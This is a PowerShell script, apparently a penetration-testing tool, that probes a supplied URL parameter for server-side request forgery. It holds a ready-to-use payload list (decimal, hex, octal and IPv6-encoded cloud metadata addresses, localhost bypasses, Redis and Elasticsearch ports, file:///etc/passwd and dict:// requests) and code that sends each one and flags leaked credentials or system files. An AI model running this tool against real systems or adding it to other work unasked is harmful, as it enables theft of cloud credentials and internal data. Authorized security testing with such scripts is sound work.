<#
.SYNOPSIS
    Automated Server-Side Request Forgery (SSRF) Payload & Mutation Prober.
.DESCRIPTION
    Tests a target injection endpoint against 20+ modern SSRF bypass encodings,
    including Decimal/Hex/Octal IPs, IPv6 mapping, Cloud Metadata endpoints,
    and protocol alternatives.
.EXAMPLE
    pwsh scripts/test_ssrf_bypasses.ps1 -TargetUrl "https://target.com/api/preview?url=FUZZ"
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $true, Position = 0)]
    [string]$TargetUrl,

    [Parameter(Mandatory = $false)]
    [string]$OutputDir = "recon_output",

    [Parameter(Mandatory = $false)]
    [int]$TimeoutSec = 8
)

$ErrorActionPreference = "Continue"

Write-Host "`n[+] ==================================================" -ForegroundColor Cyan
Write-Host "[+] Automated SSRF & Cloud Metadata Prober" -ForegroundColor Cyan
Write-Host "[+] Target Endpoint: $TargetUrl" -ForegroundColor White
Write-Host "[+] ==================================================`n" -ForegroundColor Cyan

if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
}

$reportFile = Join-Path $OutputDir "ssrf_probe_results.jsonl"

# Ensure FUZZ placeholder exists
if ($TargetUrl -notlike "*FUZZ*") {
    if ($TargetUrl -like "*?*") {
        $TargetUrl += "&url=FUZZ"
    } else {
        $TargetUrl += "?url=FUZZ"
    }
    Write-Host "[*] Appended default parameter. New target: $TargetUrl" -ForegroundColor Yellow
}

# 25 High-Signal Modern SSRF Payloads & Encoding Mutations
$payloads = @(
    # AWS IMDS
    @{ Name = "AWS IMDSv1 Plain"; Payload = "http://169.254.169.254/latest/meta-data/" },
    @{ Name = "AWS IMDS Decimal IP"; Payload = "http://2852039166/latest/meta-data/" },
    @{ Name = "AWS IMDS Hex IP"; Payload = "http://0xa9fea9fe/latest/meta-data/" },
    @{ Name = "AWS IMDS Octal IP"; Payload = "http://0251.0376.0251.0376/latest/meta-data/" },
    @{ Name = "AWS IMDS IPv6 Mapped"; Payload = "http://[::ffff:169.254.169.254]/latest/meta-data/" },
    @{ Name = "AWS IMDS DNS Wildcard"; Payload = "http://169.254.169.254.nip.io/latest/meta-data/" },

    # GCP Metadata
    @{ Name = "GCP Internal Metadata"; Payload = "http://metadata.google.internal/computeMetadata/v1/" },

    # Azure Metadata
    @{ Name = "Azure Instance Metadata"; Payload = "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },

    # Localhost Bypasses
    @{ Name = "Localhost IPv4 Standard"; Payload = "http://127.0.0.1/" },
    @{ Name = "Localhost Decimal IP"; Payload = "http://2130706433/" },
    @{ Name = "Localhost Hex IP"; Payload = "http://0x7f000001/" },
    @{ Name = "Localhost Octal IP"; Payload = "http://0177.0.0.1/" },
    @{ Name = "Localhost Shortened"; Payload = "http://127.1/" },
    @{ Name = "Localhost Zero IP"; Payload = "http://0/" },
    @{ Name = "Localhost IPv6"; Payload = "http://[::1]/" },
    @{ Name = "Localhost DNS Wildcard"; Payload = "http://127.0.0.1.nip.io/" },
    @{ Name = "Localhost Alternate Port 8080"; Payload = "http://127.0.0.1:8080/" },
    @{ Name = "Localhost Elastic Port 9200"; Payload = "http://127.0.0.1:9200/_cat/indices" },
    @{ Name = "Localhost Redis Port 6379"; Payload = "http://127.0.0.1:6379/" },

    # Protocol Alternatives
    @{ Name = "File Protocol /etc/passwd"; Payload = "file:///etc/passwd" },
    @{ Name = "File Protocol win.ini"; Payload = "file:///c:/windows/win.ini" },
    @{ Name = "Dict Protocol Memcached"; Payload = "dict://127.0.0.1:11211/stat" }
)

# Baseline measurement
Write-Host "[*] Capturing baseline response with dummy external host..." -ForegroundColor Yellow
$baselineUrl = $TargetUrl.Replace("FUZZ", [System.Uri]::EscapeDataString("https://example.com"))
$baselineLength = 0
$baselineStatus = 0

try {
    $baseResp = Invoke-WebRequest -Uri $baselineUrl -UseBasicParsing -TimeoutSec $TimeoutSec -UserAgent "Mozilla/5.0 SSRF-Auditor"
    $baselineLength = $baseResp.Content.Length
    $baselineStatus = $baseResp.StatusCode
    Write-Host "[+] Baseline captured: HTTP $baselineStatus ($baselineLength bytes)`n" -ForegroundColor DarkGray
} catch {
    Write-Host "[!] Baseline request failed or returned error. Continuing with relative checks.`n" -ForegroundColor DarkGray
}

$indicators = @("ami-id", "instance-id", "security-credentials", "root:x:0:0", "[extensions]", "redis_version", "computeMetadata")
$vulnerabilitiesFound = 0

# Probe each payload
foreach ($item in $payloads) {
    $pName = $item.Name
    $rawPayload = $item.Payload
    $encodedPayload = [System.Uri]::EscapeDataString($rawPayload)
    $testUrl = $TargetUrl.Replace("FUZZ", $encodedPayload)

    Write-Host "  -> Probing [${pName}]... " -NoNewline

    try {
        $resp = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -TimeoutSec $TimeoutSec -UserAgent "Mozilla/5.0 SSRF-Auditor"
        $status = $resp.StatusCode
        $body = $resp.Content
        $len = $body.Length

        # Check for signature indicators
        $foundIndicator = $null
        foreach ($ind in $indicators) {
            if ($body -like "*${ind}*") {
                $foundIndicator = $ind
                break
            }
        }

        if ($null -ne $foundIndicator) {
            Write-Host "[CONFIRMED VULNERABLE: Matched '${foundIndicator}'] (HTTP $status, $len bytes)" -ForegroundColor Red
            $vulnerabilitiesFound++
            $entry = [PSCustomObject]@{
                TestName   = $pName
                Payload    = $rawPayload
                Status     = $status
                Length     = $len
                Confidence = "HIGH_CONFIRMED"
                Evidence   = $foundIndicator
                Timestamp  = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            }
            $entry | ConvertTo-Json -Compress | Out-File -Append -Encoding utf8 $reportFile
        } elseif ($len -ne $baselineLength -and $len -gt 0) {
            Write-Host "[ANOMALY DETECTED] (HTTP $status, $len bytes vs baseline $baselineLength)" -ForegroundColor Yellow
            $entry = [PSCustomObject]@{
                TestName   = $pName
                Payload    = $rawPayload
                Status     = $status
                Length     = $len
                Confidence = "ANOMALY_DIFF"
                Evidence   = "Response length difference"
                Timestamp  = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            }
            $entry | ConvertTo-Json -Compress | Out-File -Append -Encoding utf8 $reportFile
        } else {
            Write-Host "[HTTP ${status}: ${len} bytes]" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "[Connection Blocked/Timed Out]" -ForegroundColor DarkGray
    }
}

Write-Host "`n[+] SSRF Probing Completed!" -ForegroundColor Green
Write-Host "[+] Confirmed Vulnerabilities: $vulnerabilitiesFound" -ForegroundColor $(if ($vulnerabilitiesFound -gt 0) { "Red" } else { "Green" })
Write-Host "[!] Detailed results saved in: $reportFile" -ForegroundColor White
